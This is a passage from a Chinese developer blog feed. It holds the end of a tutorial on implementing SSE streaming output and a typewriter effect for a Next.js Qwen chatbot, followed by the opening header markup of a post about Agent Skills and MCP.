      <span class="hljs-keyword">const</span> selectedRole = roles.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">id</span> === selectedRoleId);
      <span class="hljs-keyword">if</span> (selectedRole &amp;&amp; selectedRole.<span class="hljs-property">systemPrompt</span>) {
        <span class="hljs-comment">// 检查是否已经有系统消息，如果没有则添加</span>
        <span class="hljs-keyword">const</span> hasSystemMessage = messages.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">msg</span> =&gt;</span> msg.<span class="hljs-property">role</span> === <span class="hljs-string">'system'</span>);
        <span class="hljs-keyword">if</span> (!hasSystemMessage) {
          messagesToSend = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'system'</span>, <span class="hljs-attr">content</span>: selectedRole.<span class="hljs-property">systemPrompt</span> }, ...messagesToSend];
        }
      }
    }
    
    <span class="hljs-comment">// 发送请求到后端 API</span>
    <span class="hljs-comment">// 使用流式响应获取实时token使用情况</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/qwen'</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      },
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
        <span class="hljs-attr">messages</span>: messagesToSend,
        <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 使用流式响应</span>
        <span class="hljs-attr">model</span>: modelConfig.<span class="hljs-property">model</span>,
        <span class="hljs-attr">temperature</span>: modelConfig.<span class="hljs-property">temperature</span>,
        <span class="hljs-attr">top_p</span>: modelConfig.<span class="hljs-property">top_p</span>,
        <span class="hljs-attr">max_tokens</span>: modelConfig.<span class="hljs-property">max_tokens</span>,
      }),
    });

    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">const</span> errorData = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(errorData.<span class="hljs-property">error</span> || <span class="hljs-string">'Failed to get response from API'</span>);
    }

    <span class="hljs-comment">// 处理流式响应</span>
    <span class="hljs-keyword">const</span> reader = response.<span class="hljs-property">body</span>?.<span class="hljs-title function_">getReader</span>();
    <span class="hljs-keyword">if</span> (!reader) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Could not read response body'</span>);
    }

    <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-attr">assistantMessage</span>: <span class="hljs-title class_">Message</span> = { <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">usage</span>: <span class="hljs-literal">undefined</span> };
    
    <span class="hljs-comment">// 创建助手消息并添加到消息列表</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">newAssistantMessage</span>: <span class="hljs-title class_">Message</span> = { <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">usage</span>: <span class="hljs-literal">undefined</span> };
    <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'ADD_MESSAGE'</span>, <span class="hljs-attr">payload</span>: newAssistantMessage });

    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
      <span class="hljs-keyword">const</span> { done, value } = <span class="hljs-keyword">await</span> reader.<span class="hljs-title function_">read</span>();
      <span class="hljs-keyword">if</span> (done) <span class="hljs-keyword">break</span>;

      <span class="hljs-keyword">const</span> chunk = decoder.<span class="hljs-title function_">decode</span>(value, { <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span> });
      <span class="hljs-keyword">const</span> lines = chunk.<span class="hljs-title function_">split</span>(<span class="hljs-string">'\n'</span>);

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> line <span class="hljs-keyword">of</span> lines) {
        <span class="hljs-keyword">if</span> (line.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'data: '</span>)) {
          <span class="hljs-keyword">const</span> data = line.<span class="hljs-title function_">slice</span>(<span class="hljs-number">6</span>); <span class="hljs-comment">// 移除 'data: ' 前缀</span>
          
          <span class="hljs-keyword">if</span> (data === <span class="hljs-string">'[DONE]'</span>) {
            <span class="hljs-comment">// 流结束</span>
            <span class="hljs-keyword">break</span>;
          }

          <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">const</span> parsed = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);
            <span class="hljs-keyword">if</span> (parsed.<span class="hljs-property">content</span>) {
              <span class="hljs-comment">// 更新最后一条消息的内容</span>
              assistantMessage.<span class="hljs-property">content</span> += parsed.<span class="hljs-property">content</span>;
              <span class="hljs-comment">// 只更新助手消息，保留之前的消息</span>
              <span class="hljs-keyword">const</span> updatedMessages = [...messages, { ...assistantMessage }];
              <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'SET_MESSAGES'</span>, <span class="hljs-attr">payload</span>: updatedMessages });
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parsed.<span class="hljs-property">usage</span>) {
              <span class="hljs-comment">// 更新最后一条消息的使用情况</span>
              assistantMessage.<span class="hljs-property">usage</span> = parsed.<span class="hljs-property">usage</span>;
              <span class="hljs-keyword">const</span> updatedMessages = [...messages, { ...assistantMessage }];
              <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'SET_MESSAGES'</span>, <span class="hljs-attr">payload</span>: updatedMessages });
            }
          } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-comment">// 忽略无法解析的数据行</span>
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error parsing data:'</span>, e);
          }
        }
      }
    }
    
    <span class="hljs-comment">// 在流结束后记录对话历史</span>
    <span class="hljs-keyword">const</span> updatedMessages = [...messages, assistantMessage]; <span class="hljs-comment">// 获取包含最新消息的完整消息列表</span>
    <span class="hljs-keyword">const</span> lastAssistantMessage = updatedMessages[updatedMessages.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]; <span class="hljs-comment">// 最后一条消息应该是助手的回复</span>
    
    <span class="hljs-keyword">if</span> (lastAssistantMessage &amp;&amp; lastAssistantMessage.<span class="hljs-property">role</span> === <span class="hljs-string">'assistant'</span>) {
      <span class="hljs-keyword">const</span> <span class="hljs-attr">newHistoryEntry</span>: <span class="hljs-title class_">ConversationHistory</span> = {
        <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(), <span class="hljs-comment">// 使用时间戳作为唯一ID</span>
        <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),
        <span class="hljs-attr">input</span>: inputMessage,
        <span class="hljs-attr">output</span>: lastAssistantMessage.<span class="hljs-property">content</span>,
        <span class="hljs-attr">model</span>: modelConfig.<span class="hljs-property">model</span>,
        <span class="hljs-attr">params</span>: {
          <span class="hljs-attr">temperature</span>: modelConfig.<span class="hljs-property">temperature</span>,
          <span class="hljs-attr">top_p</span>: modelConfig.<span class="hljs-property">top_p</span>,
          <span class="hljs-attr">max_tokens</span>: modelConfig.<span class="hljs-property">max_tokens</span>,
        },
        <span class="hljs-attr">tokenUsage</span>: assistantMessage.<span class="hljs-property">usage</span> ? {
          <span class="hljs-attr">prompt_tokens</span>: assistantMessage.<span class="hljs-property">usage</span>.<span class="hljs-property">prompt_tokens</span>,
          <span class="hljs-attr">completion_tokens</span>: assistantMessage.<span class="hljs-property">usage</span>.<span class="hljs-property">completion_tokens</span>,
          <span class="hljs-attr">total_tokens</span>: assistantMessage.<span class="hljs-property">usage</span>.<span class="hljs-property">total_tokens</span>
        } : <span class="hljs-literal">undefined</span>,
        <span class="hljs-attr">evaluation</span>: <span class="hljs-string">''</span> <span class="hljs-comment">// 可以让使用者手动填写或系统自动生成</span>
      };
      
      <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'ADD_TO_HISTORY'</span>, <span class="hljs-attr">payload</span>: newHistoryEntry }); <span class="hljs-comment">// 添加到历史记录开头</span>
    }
  } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error:'</span>, error);
    <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'ADD_MESSAGE'</span>, <span class="hljs-attr">payload</span>: {
      <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>,
      <span class="hljs-attr">content</span>: <span class="hljs-string">`Error: <span class="hljs-subst">${error.message || <span class="hljs-string">'An unknown error occurred'</span>}</span>`</span>
    }});
    
    <span class="hljs-comment">// 即使出错也记录历史</span>
    <span class="hljs-keyword">const</span> errorMessage = <span class="hljs-string">`Error: <span class="hljs-subst">${error.message || <span class="hljs-string">'An unknown error occurred'</span>}</span>`</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-attr">newHistoryEntry</span>: <span class="hljs-title class_">ConversationHistory</span> = {
      <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(), <span class="hljs-comment">// 使用时间戳作为唯一ID</span>
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),
      <span class="hljs-attr">input</span>: inputMessage,
      <span class="hljs-attr">output</span>: errorMessage,
      <span class="hljs-attr">model</span>: modelConfig.<span class="hljs-property">model</span>,
      <span class="hljs-attr">params</span>: {
        <span class="hljs-attr">temperature</span>: modelConfig.<span class="hljs-property">temperature</span>,
        <span class="hljs-attr">top_p</span>: modelConfig.<span class="hljs-property">top_p</span>,
        <span class="hljs-attr">max_tokens</span>: modelConfig.<span class="hljs-property">max_tokens</span>,
      },
      <span class="hljs-attr">tokenUsage</span>: <span class="hljs-literal">undefined</span>, <span class="hljs-comment">// 错误情况下无token使用数据</span>
      <span class="hljs-attr">evaluation</span>: <span class="hljs-string">'Error occurred'</span> <span class="hljs-comment">// 标记为错误</span>
    };
    
    <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'ADD_TO_HISTORY'</span>, <span class="hljs-attr">payload</span>: newHistoryEntry }); <span class="hljs-comment">// 添加到历史记录开头</span>
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-title function_">setIsLoading</span>(<span class="hljs-literal">false</span>);
  }
};
</code></pre>
<p>核心实现要点：</p>
<ol>
<li><strong>ReadableStream Reader</strong>：使用 <code>getReader()</code> 逐块读取数据</li>
<li><strong>TextDecoder</strong>：将二进制数据解码为字符串</li>
<li><strong>状态更新</strong>：通过 Redux-like 状态管理更新消息</li>
<li><strong>错误处理</strong>：妥善处理解析错误和网络异常</li>
<li><strong>Token 使用情况</strong>：实时更新 API 调用的 token 使用情况</li>
</ol>
<h3 data-id="heading-5">前端打字机效果实现</h3>
<p>为了让流式输出看起来更自然，我们在前端实现了打字机效果：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// components/TypeWriterEffect.tsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'../styles/TypeWriterEffect.module.css'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TypeWriterEffectProps</span> {
  <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>;
  speed?: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 打字速度，毫秒/字符</span>
  className?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 自定义类名</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">TypeWriterEffect</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">TypeWriterEffectProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{ 
  text, 
  speed = <span class="hljs-number">50</span>, // 放慢速度到50ms/字符，让效果更明显
  className = <span class="hljs-string">''</span>
}</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> [displayedText, setDisplayedText] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [isTyping, setIsTyping] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-keyword">const</span> timeoutRef = useRef&lt;<span class="hljs-title class_">NodeJS</span>.<span class="hljs-property">Timeout</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 每次text变化时重置</span>
    <span class="hljs-title function_">setDisplayedText</span>(<span class="hljs-string">''</span>);
    <span class="hljs-title function_">setIsTyping</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-comment">// 清除之前的定时器</span>
    <span class="hljs-keyword">if</span> (timeoutRef.<span class="hljs-property">current</span>) {
      <span class="hljs-built_in">clearTimeout</span>(timeoutRef.<span class="hljs-property">current</span>);
    }

    <span class="hljs-comment">// 如果文本为空，直接返回</span>
    <span class="hljs-keyword">if</span> (!text) {
      <span class="hljs-title function_">setIsTyping</span>(<span class="hljs-literal">false</span>);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 开始打字</span>
    <span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">typeNextChar</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (index &lt; text.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> char = text[index];
        <span class="hljs-comment">// 确保字符不是undefined或null</span>
        <span class="hljs-keyword">if</span> (char !== <span class="hljs-literal">undefined</span> &amp;&amp; char !== <span class="hljs-literal">null</span>) {
          <span class="hljs-comment">// 强制更新，避免React优化</span>
          <span class="hljs-title function_">setDisplayedText</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-title class_">String</span>(char));
        }
        index++;
        timeoutRef.<span class="hljs-property">current</span> = <span class="hljs-built_in">setTimeout</span>(typeNextChar, speed);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">setIsTyping</span>(<span class="hljs-literal">false</span>);
      }
    };

    timeoutRef.<span class="hljs-property">current</span> = <span class="hljs-built_in">setTimeout</span>(typeNextChar, speed);

    <span class="hljs-comment">// 清理</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (timeoutRef.<span class="hljs-property">current</span>) {
        <span class="hljs-built_in">clearTimeout</span>(timeoutRef.<span class="hljs-property">current</span>);
      }
    };
  }, [text, speed]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`${<span class="hljs-attr">styles.typeWriterText</span>} ${<span class="hljs-attr">className</span>}`}&gt;</span>
      {displayedText}
      {isTyping &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.cursor}</span>&gt;</span>|<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">TypeWriterEffect</span>;
</code></pre>
<h2 data-id="heading-6">性能优化技巧</h2>
<h3 data-id="heading-7">1. 背压处理（Backpressure）</h3>
<p>当客户端处理速度跟不上服务端发送速度时，需要实现背压机制：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> writer = stream.<span class="hljs-property">writable</span>.<span class="hljs-title function_">getWriter</span>();

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">writeWithBackpressure</span>(<span class="hljs-params">data: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">await</span> writer.<span class="hljs-property">ready</span>; <span class="hljs-comment">// 等待缓冲区可写</span>
  <span class="hljs-keyword">await</span> writer.<span class="hljs-title function_">write</span>(encoder.<span class="hljs-title function_">encode</span>(data));
}
</code></pre>
<h3 data-id="heading-8">2. 分块策略</h3>
<p>合理控制每次发送的数据量，避免过小（频繁网络开销）或过大（失去流式效果）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> buffer = <span class="hljs-string">''</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CHUNK_SIZE</span> = <span class="hljs-number">50</span>; <span class="hljs-comment">// 每 50 个字符发送一次</span>

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> char <span class="hljs-keyword">of</span> response) {
  buffer += char;
  <span class="hljs-keyword">if</span> (buffer.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable constant_">CHUNK_SIZE</span>) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">writeWithBackpressure</span>(<span class="hljs-string">`data: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify({ content: buffer })}</span>\n\n`</span>);
    buffer = <span class="hljs-string">''</span>;
  }
}
</code></pre>
<h3 data-id="heading-9">3. 连接管理</h3>
<p>实现心跳检测，防止连接意外断开：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 服务端定期发送心跳</span>
<span class="hljs-keyword">const</span> heartbeatInterval = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  writer.<span class="hljs-title function_">write</span>(encoder.<span class="hljs-title function_">encode</span>(<span class="hljs-string">': heartbeat\n\n'</span>));
}, <span class="hljs-number">30000</span>);

<span class="hljs-comment">// 清理</span>
process.<span class="hljs-title function_">on</span>(<span class="hljs-string">'exit'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(heartbeatInterval));
</code></pre>
<h2 data-id="heading-10">实战案例：Qwen Chatbot 中的集成</h2>
<p>在 Qwen Chatbot 项目中，我们将以上技术整合到了真实的 AI 对话系统中：</p>
<ol>
<li><strong>消息组件集成</strong>：在 ChatWindow 组件中使用 TypeWriterEffect 显示助手回复</li>
<li><strong>状态管理</strong>：使用全局状态管理器跟踪消息流</li>
<li><strong>实时更新</strong>：SSE 流实时更新助手消息内容</li>
<li><strong>打字效果</strong>：前端实现的打字机效果增强用户体验</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// components/ChatWindow.tsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">TypeWriterEffect</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./TypeWriterEffect'</span>;

<span class="hljs-comment">// ...</span>

{messages.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">msg, index</span>) =&gt;</span> (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`${<span class="hljs-attr">styles.message</span>} ${<span class="hljs-attr">styles</span>[<span class="hljs-attr">msg.role</span>]}`}&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.avatar}</span>&gt;</span>
      {msg.role === 'user' ? '👤' : '🤖'}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.content}</span>&gt;</span>
      {msg.role === 'assistant' ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">TypeWriterEffect</span> <span class="hljs-attr">text</span>=<span class="hljs-string">{msg.content}</span> <span class="hljs-attr">speed</span>=<span class="hljs-string">{20}</span> /&gt;</span>
      ) : (
        msg.content
      )}
      {msg.usage &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.tokenInfo}</span>&gt;</span>
          Tokens: {msg.usage.total_tokens} (Prompt: {msg.usage.prompt_tokens}, Completion: {msg.usage.completion_tokens})
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
))}
</code></pre>
<h2 data-id="heading-11">注意事项与最佳实践</h2>
<ol>
<li><strong>超时处理</strong>：设置合理的超时时间，避免连接永久挂起</li>
<li><strong>错误恢复</strong>：客户端应实现重试机制，处理网络波动</li>
<li><strong>资源清理</strong>：确保 writer 和 reader 正确关闭，防止内存泄漏</li>
<li><strong>CORS 配置</strong>：跨域场景需要正确配置响应头</li>
<li><strong>进度指示</strong>：提供明确的加载状态，让用户知道系统正在工作</li>
<li><strong>打字机效果优化</strong>：不能依赖 SSE 返回粒度，必须在前端主动控制显示节奏</li>
<li><strong>API 兼容性</strong>：适配不同 LLM 提供商的 API 格式差异</li>
</ol>
<h2 data-id="heading-12">总结</h2>
<p>流式输出通过 SSE 和异步处理技术，将"等待-返回"的交互模式转变为"实时反馈"的体验。在 Qwen Chatbot 项目中，借助 Next.js 和 Web Streams API，我们优雅地实现了这一功能。无论是 AI 对话、数据处理还是实时日志，流式输出都能显著提升用户体验。</p>
<p>通过结合后端流式传输和前端打字机效果，我们实现了既高效又直观的用户交互体验。随着 Web 技术的发展，流式处理将成为构建现代 AI 应用的标配能力。掌握这项技术，让你的应用更加流畅、响应更加迅速，为用户带来更好的交互体验。</p>
<hr/>
<h3 data-id="heading-13">项目地址</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjianzhang96%2Fllm%2Ftree%2Fmain%2Fqwen-chatbot" target="_blank" title="https://github.com/jianzhang96/llm/tree/main/qwen-chatbot" ref="nofollow noopener noreferrer">github.com/jianzhang96…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fcodehub%2Fllm%2Ftree%2Fmain%2Fqwen-chatbot" target="_blank" title="https://gitee.com/codehub/llm/tree/main/qwen-chatbot" ref="nofollow noopener noreferrer">gitee.com/codehub/llm…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agent能力扩展两大关键路径：一文读懂Agent Skills和MCP协议的核心原理与设计哲学]]></title>    <link>https://juejin.cn/post/7602146335215779880</link>    <guid>https://juejin.cn/post/7602146335215779880</guid>    <pubDate>2026-02-03T03:02:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602146335215779880" data-draft-id="7602135278665318452" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agent能力扩展两大关键路径：一文读懂Agent Skills和MCP协议的核心原理与设计哲学"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-03T03:02:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="中杯可乐多加冰"/> <meta itemprop="url" content="https://juejin.cn/user/3435306702347432"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agent能力扩展两大关键路径：一文读懂Agent Skills和MCP协议的核心原理与设计哲学
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3435306702347432/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    中杯可乐多加冰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:02:26.000Z" title="Tue Feb 03 2026 03:02:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读29分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body 